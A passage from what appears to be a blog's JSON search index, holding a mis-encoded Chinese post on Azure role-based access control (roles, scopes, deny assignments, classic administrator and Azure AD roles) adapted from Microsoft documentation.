è¿™ç§æ–¹æ³•","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Rust","slug":"æŠ€æœ¯å‘/Rust","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://www.sizaif.com/tags/Rust/"}],"author":"sizaif"},{"title":"Azure RBAC","slug":"Azure-RBAC","date":"2021-12-22T07:42:59.000Z","updated":"2022-02-23T09:44:17.652Z","comments":true,"path":"posts/e56d5251/","link":"","permalink":"https://www.sizaif.com/posts/e56d5251/","excerpt":"","text":"Azure RBAC https://docs.microsoft.com/zh-cn/azure/role-based-access-control/overview https://docs.microsoft.com/zh-cn/azure/role-based-access-control/conditions-overview https://docs.microsoft.com/zh-cn/azure/role-based-access-control/rbac-and-directory-admin-roles ä»€ä¹ˆæ˜¯ Azure åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (Azure RBAC)ï¼Ÿ Azure RBAC æœ‰ä»€ä¹ˆç”¨é€”ï¼Ÿ ä¸‹é¢æ˜¯ Azure RBAC çš„ç”¨é€”çš„ä¸€äº›ç¤ºä¾‹ï¼š è®©ä¸€ä¸ªç”¨æˆ·ç®¡ç†è®¢é˜…ä¸­çš„è™šæ‹Ÿæœºï¼Œå¦ä¸€ä¸ªç”¨æˆ·ç®¡ç†è™šæ‹Ÿç½‘ç»œ è®© DBA ç»„ç®¡ç†è®¢é˜…ä¸­çš„ SQL æ•°æ®åº“ è®©æŸä¸ªç”¨æˆ·ç®¡ç†èµ„æºç»„ä¸­çš„æ‰€æœ‰èµ„æºï¼Œä¾‹å¦‚è™šæ‹Ÿæœºã€ç½‘ç«™å’Œå­ç½‘ å…è®¸æŸä¸ªåº”ç”¨ç¨‹åºè®¿é—®èµ„æºç»„ä¸­çš„æ‰€æœ‰èµ„æº Azure RBAC çš„å·¥ä½œåŸç† ä½¿ç”¨ Azure RBAC æ§åˆ¶èµ„æºè®¿é—®æƒé™çš„æ–¹å¼æ˜¯åˆ†é… Azure è§’è‰²ã€‚ è¿™æ˜¯ä¸€ä¸ªéœ€è¦ç†è§£çš„é‡è¦æ¦‚å¿µ â€” å®ƒæ¶‰åŠåˆ°å¦‚ä½•å¼ºåˆ¶å®æ–½æƒé™ã€‚ è§’è‰²åˆ†é…åŒ…å«ä¸‰ä¸ªè¦ç´ ï¼šå®‰å…¨ä¸»ä½“ã€è§’è‰²è®¢é˜…å’ŒèŒƒå›´ã€‚ å®‰å…¨ä¸»ä½“ å®‰å…¨ä¸»ä½“æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºè¯·æ±‚è®¿é—® Azure èµ„æºçš„ç”¨æˆ·ã€ç»„ã€æœåŠ¡ä¸»ä½“æˆ–æ‰˜ç®¡æ ‡è¯†ã€‚ å¯ä»¥å°†è§’è‰²åˆ†é…ç»™å…¶ä¸­ä»»ä½•ä¸€ä¸ªå®‰å…¨ä¸»ä½“ã€‚ è§’è‰²å®šä¹‰ è§’è‰²å®šä¹‰æ˜¯æƒé™çš„é›†åˆã€‚ å®ƒé€šå¸¸ç›´æ¥ç§°ä¸ºâ€œè§’è‰²â€ã€‚ è§’è‰²å®šä¹‰åˆ—å‡ºå¯æ‰§è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚è¯»å–ã€å†™å…¥å’Œåˆ é™¤ã€‚ è§’è‰²å¯ä»¥æ˜¯é«˜çº§åˆ«çš„ï¼ˆä¾‹å¦‚æ‰€æœ‰è€…ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ç‰¹å®šçš„ï¼ˆä¾‹å¦‚è™šæ‹Ÿæœºè¯»å–è€…ï¼‰ã€‚ Azure åŒ…å«å¤šä¸ªå¯ç”¨çš„å†…ç½®è§’è‰²ã€‚ ä¾‹å¦‚ï¼Œè™šæ‹Ÿæœºå‚ä¸è€…è§’è‰²å…è®¸ç”¨æˆ·åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿæœºã€‚ å¦‚æœå†…ç½®è§’è‰²ä¸èƒ½æ»¡è¶³ç»„ç»‡çš„ç‰¹å®šéœ€æ±‚ï¼Œä½ å¯ä»¥åˆ›å»ºè‡ªå·±çš„ Azure è‡ªå®šä¹‰è§’è‰²ã€‚ èŒƒå›´ èŒƒå›´æ˜¯è®¿é—®æƒé™é€‚ç”¨äºçš„èµ„æºé›†ã€‚ åˆ†é…è§’è‰²æ—¶ï¼Œå¯ä»¥é€šè¿‡å®šä¹‰èŒƒå›´æ¥è¿›ä¸€æ­¥é™åˆ¶å…è®¸çš„æ“ä½œã€‚ è‹¥è¦å°†æŸäººåˆ†é…ä¸ºç½‘ç«™å‚ä¸è€…ï¼Œä½†åªé’ˆå¯¹ä¸€ä¸ªèµ„æºç»„æ‰§è¡Œæ­¤åˆ†é…ï¼Œåˆ™å¯ä½¿ç”¨èŒƒå›´ã€‚ åœ¨ Azure ä¸­ï¼Œå¯åœ¨å››ä¸ªçº§åˆ«æŒ‡å®šèŒƒå›´ï¼šç®¡ç†ç»„ã€è®¢é˜…ã€èµ„æºç»„æˆ–èµ„æºã€‚ èŒƒå›´é‡‡ç”¨çˆ¶å­å…³ç³»ç»“æ„ã€‚ å¯ä»¥åœ¨å…¶ä¸­ä»»ä½•ä¸€ä¸ªèŒƒå›´çº§åˆ«åˆ†é…è§’è‰²ã€‚ æœ‰å…³èŒƒå›´çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…äº†è§£èŒƒå›´ã€‚ è§’è‰²åˆ†é… è§’è‰²åˆ†é…æ˜¯å‡ºäºæˆäºˆè®¿é—®æƒé™çš„ç›®çš„ï¼Œå°†è§’è‰²å®šä¹‰é™„åŠ åˆ°ç‰¹å®šèŒƒå›´å†…çš„ç”¨æˆ·ã€ç»„ã€æœåŠ¡ä¸»ä½“æˆ–æ‰˜ç®¡æ ‡è¯†çš„è¿‡ç¨‹ã€‚ é€šè¿‡åˆ›å»ºè§’è‰²åˆ†é…æ¥æˆäºˆè®¿é—®æƒé™ï¼Œé€šè¿‡åˆ é™¤è§’è‰²åˆ†é…æ¥æ’¤é”€è®¿é—®æƒé™ã€‚ ä¸‹å›¾æ˜¾ç¤ºäº†è§’è‰²åˆ†é…çš„ç¤ºä¾‹ã€‚ åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œä¸ºâ€œè¥é”€â€ç»„åˆ†é…äº†åŒ»è¯é”€å”®èµ„æºç»„çš„å‚ä¸è€…è§’è‰²ã€‚ è¿™æ„å‘³ç€ï¼Œâ€œè¥é”€â€ç»„ä¸­çš„ç”¨æˆ·å¯ä»¥åœ¨åŒ»è¯é”€å”®èµ„æºç»„ä¸­åˆ›å»ºæˆ–ç®¡ç†ä»»ä½• Azure èµ„æºã€‚ â€œè¥é”€â€ç”¨æˆ·æ— æƒè®¿é—®åŒ»è¯é”€å”®èµ„æºç»„å¤–éƒ¨çš„èµ„æºï¼Œé™¤éä»–ä»¬å±äºå¦ä¸€ä¸ªè§’è‰²åˆ†é…ã€‚ å¯ä½¿ç”¨ Azure é—¨æˆ·ã€Azure CLIã€Azure PowerShellã€Azure SDK æˆ– REST API åˆ†é…è§’è‰²ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…åˆ†é… Azure è§’è‰²çš„æ­¥éª¤ã€‚ ç»„ è§’è‰²åˆ†é…å¯¹ç»„æ¥è¯´æ˜¯å¯ä¼ é€’çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœæŸç”¨æˆ·æ˜¯æŸä¸ªç»„çš„æˆå‘˜ï¼Œè€Œè¯¥ç»„å±äºå…·æœ‰è§’è‰²åˆ†é…çš„å¦ä¸€ä¸ªç»„ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å°†å…·æœ‰è¯¥è§’è‰²åˆ†é…ä¸­çš„æƒé™ã€‚ å¤šè§’è‰²åˆ†é… å¦‚æœæœ‰å¤šä¸ªé‡å çš„è§’è‰²åˆ†é…ï¼Œå°†ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ Azure RBAC æ˜¯ä¸€ä¸ªåŠ æ³•æ¨¡å‹ï¼Œå› æ­¤æœ‰æ•ˆæƒé™æ˜¯è§’è‰²åˆ†é…çš„æ€»å’Œã€‚ è¯·è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œå…¶ä¸­åœ¨è®¢é˜…èŒƒå›´å†…å‘ç”¨æˆ·æˆäºˆäº†â€œå‚ä¸è€…â€è§’è‰²ï¼Œå¹¶ä¸”æˆäºˆäº†å¯¹èµ„æºç»„çš„â€œè¯»è€…â€è§’è‰²ã€‚ â€œå‚ä¸è€…â€æƒé™ä¸â€œè¯»è€…â€æƒé™çš„æ€»å’Œå®é™…ä¸Šæ˜¯è®¢é˜…çš„â€œå‚ä¸è€…â€è§’è‰²ã€‚ å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œâ€œè¯»è€…â€è§’è‰²åˆ†é…æ²¡æœ‰ä»»ä½•å½±å“ã€‚ æ‹’ç»åˆ†é… ä»¥å‰ï¼ŒAzure RBAC æ˜¯ä¸€ç§åªèƒ½æ‰§è¡Œå…è®¸æ“ä½œçš„æ¨¡å‹ï¼Œæ²¡æœ‰æ‹’ç»åŠŸèƒ½ï¼Œä½† Azure RBAC ç°åœ¨ä»¥æœ‰é™æ–¹å¼æ”¯æŒæ‹’ç»åˆ†é…ã€‚ æ‹’ç»åˆ†é…ç±»ä¼¼äºè§’è‰²åˆ†é…ï¼Œå¯å°†ä¸€ç»„æ‹’ç»æ“ä½œé™„åŠ åˆ°ç‰¹å®šèŒƒå›´å†…çš„ç”¨æˆ·ã€ç»„ã€æœåŠ¡ä¸»ä½“æˆ–æ‰˜ç®¡æ ‡è¯†ï¼Œä»¥ä¾¿æ‹’ç»è®¿é—®ã€‚ è§’è‰²åˆ†é…å®šä¹‰äº†ä¸€ç»„å…è®¸çš„æ“ä½œï¼Œè€Œæ‹’ç»åˆ†é…å®šä¹‰äº†ä¸€ç»„ä¸å…è®¸çš„æ“ä½œã€‚ æ¢è€Œè¨€ä¹‹ï¼Œå³ä½¿è§’è‰²åˆ†é…æˆäºˆç”¨æˆ·è®¿é—®æƒé™ï¼Œæ‹’ç»åˆ†é…ä¹Ÿä¼šé˜»æ­¢ç”¨æˆ·æ‰§è¡ŒæŒ‡å®šçš„æ“ä½œã€‚ æ‹’ç»åˆ†é…ä¼˜å…ˆäºè§’è‰²åˆ†é…ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…äº†è§£ Azure æ‹’ç»åˆ†é…ã€‚ Azure RBAC å¦‚ä½•ç¡®å®šç”¨æˆ·æ˜¯å¦æœ‰æƒè®¿é—®èµ„æº ä¸‹é¢æ˜¯ Azure RBAC ç”¨äºç¡®å®šä½ æ˜¯å¦å¯è®¿é—®èµ„æºçš„æ¦‚è¦æ­¥éª¤ã€‚ è¿™äº›æ­¥éª¤é€‚ç”¨äºä¸ Azure RBAC é›†æˆçš„ Azure èµ„æºç®¡ç†å™¨æˆ–æ•°æ®å¹³é¢æœåŠ¡ã€‚ å¦‚æœæ­£åœ¨å°è¯•å¯¹è®¿é—®é—®é¢˜è¿›è¡Œæ•…éšœæ’é™¤ï¼Œè¿™æœ‰åŠ©äºäº†è§£é—®é¢˜ã€‚ ç”¨æˆ·ï¼ˆæˆ–æœåŠ¡ä¸»ä½“ï¼‰è·å– Azure èµ„æºç®¡ç†å™¨çš„ä»¤ç‰Œã€‚ ä»¤ç‰ŒåŒ…å«ç”¨æˆ·çš„ç»„æˆå‘˜èº«ä»½ï¼ˆåŒ…æ‹¬å¯ä¼ é€’çš„ç»„æˆå‘˜èº«ä»½ï¼‰ã€‚ ç”¨æˆ·ä½¿ç”¨é™„åŠ çš„ä»¤ç‰Œå¯¹ Azure èµ„æºç®¡ç†å™¨å‘å‡º REST API è°ƒç”¨ã€‚ Azure èµ„æºç®¡ç†å™¨æ£€ç´¢é€‚ç”¨äºå¯¹å…¶æ‰§è¡Œæ“ä½œçš„èµ„æºçš„æ‰€æœ‰è§’è‰²åˆ†é…å’Œæ‹’ç»åˆ†é…ã€‚ å¦‚æœæ‹’ç»åˆ†é…é€‚ç”¨ï¼Œåˆ™é˜»æ­¢è®¿é—®ã€‚ å¦åˆ™ï¼Œè¯„ä¼°å°†ç»§ç»­è¿›è¡Œã€‚ Azure èµ„æºç®¡ç†å™¨ç¼©å°é€‚ç”¨äºæ­¤ç”¨æˆ·æˆ–å…¶ç»„çš„è§’è‰²åˆ†é…èŒƒå›´ï¼Œå¹¶ç¡®å®šç”¨æˆ·é’ˆå¯¹æ­¤èµ„æºæ‹¥æœ‰çš„è§’è‰²ã€‚ Azure èµ„æºç®¡ç†å™¨ç¡®å®š API è°ƒç”¨ä¸­çš„æ“ä½œæ˜¯å¦åŒ…å«åœ¨ç”¨æˆ·é’ˆå¯¹æ­¤èµ„æºæ‹¥æœ‰çš„è§’è‰²ä¸­ã€‚ å¦‚æœè§’è‰²åŒ…å«çš„ Actions å…·æœ‰é€šé…ç¬¦ (*)ï¼Œåˆ™é€šè¿‡ä»å…è®¸çš„ Actions ä¸­å‡å» NotActions æ¥è®¡ç®—æœ‰æ•ˆæƒé™ã€‚ åŒæ ·ï¼Œå¯¹ä»»ä½•æ•°æ®æ“ä½œæ‰§è¡Œç›¸åŒçš„å‡æ³•è¿ç®—ã€‚ Actions - NotActions = Effective management permissions DataActions - NotDataActions = Effective data permissions å¦‚æœç”¨æˆ·åœ¨è¯·æ±‚çš„èŒƒå›´å†…æ²¡æœ‰åŒ…å«è¯¥æ“ä½œçš„è§’è‰²ï¼Œåˆ™ä¸å…è®¸è®¿é—®ã€‚ å¦åˆ™ï¼Œå°†è¯„ä¼°ä»»ä½•æ¡ä»¶ã€‚ å¦‚æœè§’è‰²åˆ†é…åŒ…å«æ¡ä»¶ï¼Œåˆ™å¯¹è¿™äº›æ¡ä»¶è¿›è¡Œè¯„ä¼°ã€‚ å¦åˆ™å°†å…è®¸è®¿é—®ã€‚ å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™å…è®¸è®¿é—®ã€‚ å¦åˆ™å°†ä¸å…è®¸è®¿é—®ã€‚ ä¸‹å›¾æ˜¯è¯„ä¼°é€»è¾‘çš„æ‘˜è¦ã€‚ ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²ã€Azure è§’è‰²å’Œ Azure AD è§’è‰² ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰² Azure è§’è‰² Azure Active Directory (Azure AD) è§’è‰² è§’è‰²ä¹‹é—´çš„ç›¸äº’å…³ç³» è‹¥è¦æ›´å¥½åœ°ç†è§£ Azure ä¸­çš„è§’è‰²ï¼Œæœ€å¥½æ˜¯å…ˆäº†è§£ä¸€äº›å†å²ä¿¡æ¯ã€‚ Azure æœ€åˆå‘å¸ƒæ—¶ï¼Œå¯¹èµ„æºçš„è®¿é—®æƒé™åªæ˜¯é€šè¿‡ä»¥ä¸‹ä¸‰ç§ç®¡ç†å‘˜è§’è‰²è¿›è¡Œç®¡ç†ï¼šå¸æˆ·ç®¡ç†å‘˜ã€æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜ã€‚ åæ¥æ·»åŠ äº† Azure åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (Azure RBAC)ã€‚ Azure RBAC æ˜¯ä¸€ä¸ªè¾ƒæ–°çš„æˆæƒç³»ç»Ÿï¼Œå®ƒé’ˆå¯¹ Azure èµ„æºæä¾›ç²¾ç»†çš„è®¿é—®ç®¡ç†ã€‚ Azure RBAC åŒ…æ‹¬è®¸å¤šå†…ç½®è§’è‰²ï¼Œå¯åœ¨ä¸åŒçš„èŒƒå›´è¿›è¡Œåˆ†é…ï¼Œå¹¶å…è®¸ä½ åˆ›å»ºè‡ªå·±çš„è‡ªå®šä¹‰è§’è‰²ã€‚ è‹¥è¦ç®¡ç† Azure AD ä¸­çš„èµ„æºï¼ˆä¾‹å¦‚ç”¨æˆ·ã€ç»„å’ŒåŸŸï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å¤šç§ Azure AD è§’è‰²ã€‚ ä¸‹å›¾ä»è¾ƒé«˜çš„å±‚é¢æ˜¾ç¤ºäº†ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²ã€Azure è§’è‰²ä¸ Azure AD è§’è‰²ä¹‹é—´çš„ç›¸äº’å…³ç³»ã€‚ ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰² å¸æˆ·ç®¡ç†å‘˜ã€æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜æ˜¯ Azure ä¸­çš„ä¸‰ç§ç»å…¸è®¢é˜…ç®¡ç†å‘˜è§’è‰²ã€‚ ç»å…¸è®¢é˜…ç®¡ç†å‘˜å¯¹ Azure è®¢é˜…æ‹¥æœ‰å®Œå…¨è®¿é—®æƒé™ã€‚ ä»–ä»¬å¯ä»¥ä½¿ç”¨ Azure é—¨æˆ·ã€Azure èµ„æºç®¡ç†å™¨ API å’Œç»å…¸éƒ¨ç½²æ¨¡å‹ API æ¥ç®¡ç†èµ„æºã€‚ ç”¨äºæ³¨å†Œ Azure çš„å¸æˆ·ä¼šè‡ªåŠ¨åŒæ—¶è®¾ç½®ä¸ºå¸æˆ·ç®¡ç†å‘˜å’ŒæœåŠ¡ç®¡ç†å‘˜ã€‚å…¶æ¬¡ï¼Œå¯ä»¥æ·»åŠ å…¶ä»–å…±åŒç®¡ç†å‘˜ã€‚ æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜æ‹¥æœ‰åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰²ï¼ˆä¸€ä¸ª Azure è§’è‰²ï¼‰çš„ç”¨æˆ·çš„ç­‰æ•ˆè®¿é—®æƒé™ã€‚ ä¸‹è¡¨æè¿°äº†è¿™ä¸‰ç§ç»å…¸è®¢é˜…ç®¡ç†è§’è‰²ä¹‹é—´çš„å·®åˆ«ã€‚ ç»å…¸è®¢é˜…ç®¡ç†å‘˜ é™åˆ¶ æƒé™ è¯´æ˜ å¸æˆ·ç®¡ç†å‘˜ æ¯ä¸ª Azure å¸æˆ·æœ‰ 1 ä¸ª å¯ä»¥è®¿é—® Azure é—¨æˆ·å¹¶ç®¡ç†è®¡è´¹ç®¡ç†å¸æˆ·ä¸­æ‰€æœ‰è®¢é˜…çš„è®¡è´¹åˆ›å»ºæ–°è®¢é˜…å–æ¶ˆè®¢é˜…æ›´æ”¹è®¢é˜…çš„è®¡è´¹æ›´æ”¹æœåŠ¡ç®¡ç†å‘˜é™¤éå…·æœ‰æœåŠ¡ç®¡ç†å‘˜æˆ–è®¢é˜…æ‰€æœ‰è€…è§’è‰²ï¼Œå¦åˆ™æ— æ³•å–æ¶ˆè®¢é˜… åœ¨æ¦‚å¿µä¸Šæ˜¯è®¢é˜…çš„è®¡è´¹æ‰€æœ‰è€…ã€‚ æœåŠ¡ç®¡ç†å‘˜ æ¯ä¸ª Azure è®¢é˜…æœ‰ 1 ä¸ª åœ¨ Azure é—¨æˆ·ä¸­ç®¡ç†æœåŠ¡å–æ¶ˆè®¢é˜…å°†ç”¨æˆ·åˆ†é…åˆ°å…±åŒç®¡ç†å‘˜è§’è‰² é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–°è®¢é˜…çš„å¸æˆ·ç®¡ç†å‘˜ä¹Ÿæ˜¯æœåŠ¡ç®¡ç†å‘˜ã€‚ æœåŠ¡ç®¡ç†å‘˜æ‹¥æœ‰åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰²çš„ç”¨æˆ·çš„ç­‰æ•ˆè®¿é—®æƒé™ã€‚ æœåŠ¡ç®¡ç†å‘˜å…·æœ‰ Azure é—¨æˆ·çš„å®Œå…¨è®¿é—®æƒé™ã€‚ å…±åŒç®¡ç†å‘˜ æ¯ä¸ªè®¢é˜…æœ‰ 200 ä¸ª ä¸æœåŠ¡ç®¡ç†å‘˜çš„è®¿é—®ç‰¹æƒç›¸åŒï¼Œä½†æ— æ³•æ›´æ”¹è®¢é˜…ä¸ Azure ç›®å½•ä¹‹é—´çš„å…³è”ã€‚å°†ç”¨æˆ·åˆ†é…åˆ°å…±åŒç®¡ç†å‘˜è§’è‰²ï¼Œä½†æ— æ³•æ›´æ”¹æœåŠ¡ç®¡ç†å‘˜ å…±åŒç®¡ç†å‘˜æ‹¥æœ‰åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰²çš„ç”¨æˆ·çš„ç­‰æ•ˆè®¿é—®æƒé™ã€‚ åœ¨ Azure é—¨æˆ·ä¸­ï¼Œå¯ä»¥ä½¿ç”¨â€œç»å…¸ç®¡ç†å‘˜â€é€‰é¡¹å¡ç®¡ç†å…±åŒç®¡ç†å‘˜æˆ–æŸ¥çœ‹æœåŠ¡ç®¡ç†å‘˜ã€‚ åœ¨ Azure é—¨æˆ·ä¸­ï¼Œå¯ä»¥åœ¨è®¢é˜…çš„å±æ€§è¾¹æ é€‰é¡¹å¡ä¸Šï¼ŒæŸ¥çœ‹æˆ–æ›´æ”¹æœåŠ¡ç®¡ç†å‘˜ï¼Œæˆ–æ˜¯æŸ¥çœ‹å¸æˆ·ç®¡ç†å‘˜ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Azure ç»å…¸è®¢é˜…ç®¡ç†å‘˜ã€‚ Azure å¸æˆ·å’Œ Azure è®¢é˜… Azure å¸æˆ·ä»£è¡¨è®¡è´¹å…³ç³»ã€‚ ä¸€ä¸ª Azure å¸æˆ·ä»£è¡¨ä¸€ä¸ªç”¨æˆ·æ ‡è¯†ã€ä¸€ä¸ªæˆ–å¤šä¸ª Azure è®¢é˜…å’Œä¸€ç»„å…³è”çš„ Azure èµ„æºã€‚ åˆ›å»ºå¸æˆ·çš„äººå‘˜æ˜¯è¯¥å¸æˆ·ä¸­åˆ›å»ºçš„æ‰€æœ‰è®¢é˜…çš„å¸æˆ·ç®¡ç†å‘˜ã€‚ æ­¤äººä¹Ÿæ˜¯è®¢é˜…çš„é»˜è®¤æœåŠ¡ç®¡ç†å‘˜ã€‚ Azure è®¢é˜…å¯å¸®åŠ©ä½ ç»„ç»‡ Azure èµ„æºçš„è®¿é—®æƒé™ã€‚ å®ƒä»¬è¿˜å¯å¸®åŠ©æ§åˆ¶å¦‚ä½•æ ¹æ®èµ„æºä½¿ç”¨é‡ç”ŸæˆæŠ¥å‘Šã€è®¡è´¹åŠä»˜è´¹ã€‚ æ¯ä¸ªè®¢é˜…å¯ä»¥é‡‡ç”¨ä¸åŒçš„è®¡è´¹å’Œä»˜æ¬¾è®¾ç½®ï¼Œå› æ­¤ï¼Œæ ¹æ®åŠå…¬å®¤ã€éƒ¨é—¨ã€é¡¹ç›®ç­‰å› ç´ ï¼Œå¯ä»¥é‡‡ç”¨ä¸åŒçš„è®¢é˜…å’Œä¸åŒçš„è®¡åˆ’ã€‚ æ¯ä¸ªæœåŠ¡å±äºä¸€ä¸ªè®¢é˜…ï¼Œæ‰§è¡Œç¼–ç¨‹æ“ä½œæ—¶å¯èƒ½éœ€è¦è®¢é˜… IDã€‚ æ¯ä¸ªè®¢é˜…éƒ½ä¸ä¸€ä¸ª Azure AD ç›®å½•ç›¸å…³è”ã€‚ è‹¥è¦æŸ¥æ‰¾ä¸è®¢é˜…å…³è”çš„ç›®å½•ï¼Œè¯·åœ¨ Azure é—¨æˆ·ä¸­æ‰“å¼€â€œè®¢é˜…â€ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªè®¢é˜…ä»¥æŸ¥çœ‹ç›®å½•ã€‚ å¸æˆ·å’Œè®¢é˜…åœ¨ Azure é—¨æˆ·ä¸­è¿›è¡Œç®¡ç†ã€‚ Azure è§’è‰² Azure RBAC æ˜¯åŸºäº Azure èµ„æºç®¡ç†å™¨æ„å»ºçš„æˆæƒç³»ç»Ÿï¼Œå®ƒé’ˆå¯¹ Azure èµ„æºï¼ˆä¾‹å¦‚è®¡ç®—å’Œå­˜å‚¨ï¼‰æä¾›ç²¾ç»†çš„è®¿é—®æƒé™ç®¡ç†ã€‚ Azure RBAC åŒ…æ‹¬ 70 å¤šä¸ªå†…ç½®è§’è‰²ã€‚ æœ‰å››ä¸ªåŸºæœ¬çš„ Azure è§’è‰²ã€‚ å‰ä¸‰ä¸ªè§’è‰²é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ï¼š Azure è§’è‰² æƒé™ è¯´æ˜ æ‰€æœ‰è€… å¯¹æ‰€æœ‰èµ„æºçš„å®Œå…¨è®¿é—®æƒé™å°†è®¿é—®æƒé™å§”æ‰˜ç»™å…¶ä»–äºº æœåŠ¡ç®¡ç†å‘˜å’Œå…±åŒç®¡ç†å‘˜åœ¨è®¢é˜…èŒƒå›´å†…åˆ†é…æœ‰â€œæ‰€æœ‰è€…â€è§’è‰² é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ã€‚ å‚ä¸è€… åˆ›å»ºå’Œç®¡ç†æ‰€æœ‰ç±»å‹çš„ Azure èµ„æºåœ¨ Azure Active Directory ä¸­åˆ›å»ºä¸€ä¸ªæ–°ç§Ÿæˆ·æ— æ³•å°†è®¿é—®æƒé™æˆäºˆå…¶ä»–äºº é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ã€‚ è¯»å–è€… æŸ¥çœ‹ Azure èµ„æº é€‚ç”¨äºæ‰€æœ‰èµ„æºç±»å‹ã€‚ ç”¨æˆ·è®¿é—®ç®¡ç†å‘˜ ç®¡ç†ç”¨æˆ·å¯¹ Azure èµ„æºçš„è®¿é—® å‰©ä½™çš„å†…ç½®è§’è‰²å…è®¸ç®¡ç†ç‰¹å®šçš„ Azure èµ„æºã€‚ ä¾‹å¦‚ï¼Œè™šæ‹Ÿæœºå‚ä¸è€…è§’è‰²å…è®¸ç”¨æˆ·åˆ›å»ºå’Œç®¡ç†è™šæ‹Ÿæœºã€‚ æœ‰å…³æ‰€æœ‰å†…ç½®è§’è‰²çš„åˆ—è¡¨ï¼Œè¯·å‚é˜… Azure å†…ç½®è§’è‰²ã€‚ åªæœ‰ Azure é—¨æˆ·å’Œ Azure èµ„æºç®¡ç†å™¨ API æ”¯æŒ Azure RBACã€‚ åˆ†é…æœ‰ Azure è§’è‰²çš„ç”¨æˆ·ã€ç»„å’Œåº”ç”¨ç¨‹åºæ— æ³•ä½¿ç”¨ Azure ç»å…¸éƒ¨ç½²æ¨¡å‹ APIã€‚ åœ¨ Azure é—¨æˆ·ä¸­ï¼Œä½¿ç”¨ Azure RBAC çš„è§’è‰²åˆ†é…æ˜¾ç¤ºåœ¨â€œè®¿é—®æ§åˆ¶(æ ‡è¯†å’Œè®¿é—®ç®¡ç†)â€è¾¹æ é€‰é¡¹å¡ä¸Šã€‚ åœ¨æ•´ä¸ªé—¨æˆ·ä¸­éƒ½å¯ä»¥æ‰¾åˆ°æ­¤è¾¹æ é€‰é¡¹å¡ï¼Œä¾‹å¦‚ï¼Œåœ¨ç®¡ç†ç»„ã€è®¢é˜…ã€èµ„æºç»„å’Œå„ç§èµ„æºæ‰€åœ¨çš„éƒ¨åˆ†ã€‚ å•å‡»â€œè§’è‰²â€é€‰é¡¹å¡æ—¶ï¼Œä¼šçœ‹åˆ°å†…ç½®è§’è‰²å’Œè‡ªå®šä¹‰è§’è‰²çš„åˆ—è¡¨ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ä½¿ç”¨ Azure é—¨æˆ·åˆ†é… Azure è§’è‰²ã€‚ Azure AD è§’è‰² Azure AD è§’è‰²ç”¨äºç®¡ç†ç›®å½•ä¸­çš„ Azure AD èµ„æºï¼Œä¾‹å¦‚ï¼Œåˆ›å»ºæˆ–ç¼–è¾‘ç”¨æˆ·ã€å°†ç®¡ç†è§’è‰²åˆ†é…ç»™å…¶ä»–äººã€é‡ç½®ç”¨æˆ·å¯†ç ã€ç®¡ç†ç”¨æˆ·è®¸å¯è¯ä»¥åŠç®¡ç†åŸŸã€‚ ä¸‹è¡¨æè¿°äº†å‡ ä¸ªæ›´é‡è¦çš„ Azure AD è§’è‰²ã€‚ Azure AD è§’è‰² æƒé™ è¯´æ˜ å…¨å±€ç®¡ç†å‘˜ ç®¡ç†å¯¹ Azure Active Directory ä¸­æ‰€æœ‰ç®¡ç†åŠŸèƒ½çš„è®¿é—®ï¼Œä»¥åŠä¸ Azure Active Directory è”åˆçš„æœåŠ¡å°†ç®¡ç†å‘˜è§’è‰²åˆ†é…ç»™å…¶ä»–äººé‡ç½®ä»»ä½•ç”¨æˆ·å’Œå…¶ä»–æ‰€æœ‰ç®¡ç†å‘˜çš„å¯†ç  æ³¨å†Œ Azure Active Directory ç§Ÿæˆ·çš„äººå‘˜å°†æˆä¸ºå…¨å±€ç®¡ç†å‘˜ã€‚ ç”¨æˆ·ç®¡ç†å‘˜ 